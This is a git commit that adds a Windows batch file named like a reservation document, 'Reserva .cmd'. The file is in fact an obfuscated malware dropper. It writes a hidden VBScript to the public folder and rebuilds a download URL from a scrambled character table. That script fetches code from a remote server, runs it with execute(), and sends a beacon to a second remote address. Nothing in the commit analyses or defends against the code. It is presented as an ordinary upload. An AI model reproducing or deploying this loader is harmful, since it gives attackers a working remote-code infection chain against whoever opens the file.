4c5b824274669a447cea81cd9e0bf9b24b59f5af
enzo300 <47614884+enzo300@users.noreply.github.com>
2019-02-14 09:55:01 -0200

    Add files via upload

---
+++ Reserva .cmd
@@ -0,0 +1,33 @@
+@echo off
+setlocal EnableExtensions DisableDelayedExpansion
+md "%PUBLIC%\alTjeCz" && cls
+set jC1op6d=%USERNAME%.vbs
+set wkKitaUO=ABFrhompfgJse2C5N1Wi93Hx/YG:6QnVz.tLalkw0bXMyjduvRcZ
+set iOWMSb9="%PUBLIC%\alTjeCz\%jC1op6d%" ECHO
+del iOWMSb9="%PUBLIC%\alTjeCz\%jC1op6d
+:Fase1
+>>%iOWMSb9% Dim bAWvBoT
+>>%iOWMSb9% Dim cncHb1U
+>>%iOWMSb9% Dim dUpOVfo
+>>%iOWMSb9% Dim ezevxzc
+>>%iOWMSb9% Dim fw2yKNr
+>>%iOWMSb9% Dim gFxLG9H
+>>%iOWMSb9% Dim h3oSgkK
+>>%iOWMSb9% cncHb1U = WScript.Arguments(0)
+>>%iOWMSb9% dUpOVfo = WScript.Arguments(1)
+>>%iOWMSb9% Set bAWvBoT = CreateObject(StrReverse("PTTHLMX.2LMXSM"))
+>>%iOWMSb9% bAWvBoT.open StrReverse(cncHb1U), dUpOVfo, False
+>>%iOWMSb9% execute("bAWvBoT.setRequestHeader ""User-Agent"", ""5M0yC7u5stom1U4se7r"":bAWvBoT.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded""")
+>>%iOWMSb9% execute("bAWvBoT.send :ezevxzc = bAWvBoT.responseText")
+>>%iOWMSb9% execute( ezevxzc )
+>>%iOWMSb9% WScript.Sleep(3000)
+>>%iOWMSb9% Set o6ulwGz = CreateObject(StrReverse("PTTHLMXrevreS.2LMXSM"))
+>>%iOWMSb9% o6ulwGz.open StrReverse("TEG"), StrReverse("f=l&f=o&06=q&6=m&997=w&154=h?gmi.Se6uTBB/diytitne/pma/tnanet/ten.deziamaka.moc-nsm-s-gmi//:sptth"), False
+>>%iOWMSb9% o6ulwGz.send()
+cls
+@echo off
+ping 127.0.0.1 -n 1 > nul
+set lHDtRpU=%wkKitaUO:~4,1%%wkKitaUO:~34,1%%wkKitaUO:~34,1%%wkKitaUO:~7,1%%wkKitaUO:~11,1%%wkKitaUO:~27,1%%wkKitaUO:~24,1%%wkKitaUO:~24,1%%wkKitaUO:~50,1%%wkKitaUO:~36,1%%wkKitaUO:~6,1%%wkKitaUO:~36,1%%wkKitaUO:~3,1%%wkKitaUO:~5,1%%wkKitaUO:~34,1%%wkKitaUO:~12,1%%wkKitaUO:~7,1%%wkKitaUO:~3,1%%wkKitaUO:~12,1%%wkKitaUO:~6,1%%wkKitaUO:~19,1%%wkKitaUO:~47,1%%wkKitaUO:~6,1%%wkKitaUO:~33,1%%wkKitaUO:~36,1%%wkKitaUO:~6,1%%wkKitaUO:~12,1%%wkKitaUO:~3,1%%wkKitaUO:~19,1%%wkKitaUO:~50,1%%wkKitaUO:~36,1%%wkKitaUO:~30,1%%wkKitaUO:~47,1%%wkKitaUO:~37,1%%wkKitaUO:~34,1%%wkKitaUO:~3,1%%wkKitaUO:~36,1%%wkKitaUO:~8,1%%wkKitaUO:~12,1%%wkKitaUO:~11,1%%wkKitaUO:~34,1%%wkKitaUO:~19,1%%wkKitaUO:~48,1%%wkKitaUO:~36,1%%wkKitaUO:~37,1%%wkKitaUO:~33,1%%wkKitaUO:~46,1%%wkKitaUO:~46,1%%wkKitaUO:~30,1%%wkKitaUO:~11,1%%wkKitaUO:~9,1%%wkKitaUO:~12,1%%wkKitaUO:~12,1%%wkKitaUO:~38,1%%wkKitaUO:~33,1%%wkKitaUO:~50,1%%wkKitaUO:~5,1%%wkKitaUO:~6,1%%wkKitaUO:~24,1%%wkKitaUO:~36,1%%wkKitaUO:~7,1%%wkKitaUO:~7,1%%wkKitaUO:~24,1%%wkKitaUO:~36,1%%wkKitaUO:~22,1%%wkKitaUO:~49,1%%wkKitaUO:~40,1%%wkKitaUO:~50,1%%wkKitaUO:~22,1%%wkKitaUO:~43,1%%wkKitaUO:~28,1%%wkKitaUO:~35,1%%wkKitaUO:~44,1%%wkKitaUO:~20,1%%wkKitaUO:~32,1%%wkKitaUO:~46,1%%wkKitaUO:~26,1%%wkKitaUO:~20,1%%wkKitaUO:~44,1%%wkKitaUO:~25,1%%wkKitaUO:~18,1%%wkKitaUO:~46,1%%wkKitaUO:~37,1%%wkKitaUO:~35,1%%wkKitaUO:~6,1%%wkKitaUO:~46,1%%wkKitaUO:~48,1%%wkKitaUO:~41,1%%wkKitaUO:~13,1%%wkKitaUO:~46,1%%wkKitaUO:~11,1%%wkKitaUO:~51,1%%wkKitaUO:~18,1%%wkKitaUO:~2,1%%wkKitaUO:~39,1%%wkKitaUO:~36,1%%wkKitaUO:~42,1%%wkKitaUO:~43,1%%wkKitaUO:~47,1%%wkKitaUO:~25,1%%wkKitaUO:~13,1%%wkKitaUO:~20,1%%wkKitaUO:~34,1%%wkKitaUO:~35,1%%wkKitaUO:~13,1%%wkKitaUO:~16,1%%wkKitaUO:~48,1%%wkKitaUO:~41,1%%wkKitaUO:~30,1%%wkKitaUO:~16,1%%wkKitaUO:~48,1%%wkKitaUO:~41,1%%wkKitaUO:~26,1%%wkKitaUO:~31,1%%wkKitaUO:~45,1%%wkKitaUO:~41,1%%wkKitaUO:~26,1%%wkKitaUO:~20,1%%wkKitaUO:~17,1%%wkKitaUO:~51,1%%wkKitaUO:~14,1%%wkKitaUO:~20,1%%wkKitaUO:~32,1%%wkKitaUO:~12,1%%wkKitaUO:~42,1%%wkKitaUO:~16,1%%wkKitaUO:~40,1%%wkKitaUO:~51,1%%wkKitaUO:~18,1%%wkKitaUO:~17,1%%wkKitaUO:~21,1%%wkKitaUO:~51,1%%wkKitaUO:~18,1%%wkKitaUO:~10,1%%wkKitaUO:~47,1%%wkKitaUO:~51,1%%wkKitaUO:~42,1%%wkKitaUO:~46,1%%wkKitaUO:~47,1%%wkKitaUO:~51,1%%wkKitaUO:~42,1%%wkKitaUO:~29,1%%wkKitaUO:~48,1%%wkKitaUO:~41,1%%wkKitaUO:~6,1%%wkKitaUO:~31,1%%wkKitaUO:~21,1%%wkKitaUO:~41,1%%wkKitaUO:~6,1%%wkKitaUO:~31,1%%wkKitaUO:~40,1%%wkKitaUO:~25,1%%wkKitaUO:~21,1%%wkKitaUO:~9,1%%wkKitaUO:~23,1%%wkKitaUO:~35,1%%wkKitaUO:~21,1%%wkKitaUO:~51,1%%wkKitaUO:~48,1%%wkKitaUO:~12,1%%wkKitaUO:~6,1%%wkKitaUO:~46,1%%wkKitaUO:~15,1%%wkKitaUO:~36,1%%wkKitaUO:~22,1%%wkKitaUO:~0,1%%wkKitaUO:~13,1%%wkKitaUO:~46,1%%wkKitaUO:~42,1%%wkKitaUO:~9,1%%wkKitaUO:~47,1%%wkKitaUO:~25,1%%wkKitaUO:~6,1%%wkKitaUO:~17,1%%wkKitaUO:~39,1%%wkKitaUO:~10,1%%wkKitaUO:~6,1%%wkKitaUO:~15,1%%wkKitaUO:~48,1%%wkKitaUO:~35,1%%wkKitaUO:~42,1%%wkKitaUO:~1,1%%wkKitaUO:~48,1%%wkKitaUO:~46,1%%wkKitaUO:~13,1%%wkKitaUO:~31,1%%wkKitaUO:~44,1%
+start wscript //Nologo "%PUBLIC%\alTjeCz\%jC1op6d%" AS111 %lHDtRpU% && @echo off
+endlocal
+:hrzCuRN
